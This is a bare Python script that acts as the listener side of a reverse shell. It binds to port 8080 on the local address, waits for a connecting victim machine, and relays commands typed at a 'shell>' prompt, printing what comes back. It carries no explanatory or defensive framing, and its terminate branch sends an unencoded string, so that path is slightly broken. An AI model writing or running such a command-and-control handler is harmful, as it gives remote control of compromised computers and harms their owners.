import socket
global z
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
z = s.getsockname()[0]
s.close()
print(z)
def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((z, 8080))
    s.listen(1)

    conn, addr = s.accept()

    print ('[+]We got a connection from:',addr)
    while True:

        command=input("shell>")
        if 'terminate' in command:
            conn.sendall('terminate')
            conn.close()
            break
        else:
            conn.sendall(command.encode('utf-8'))
            data =conn.recv(1024)
            data.decode()
            print(data)

def main():
    connect()


main()
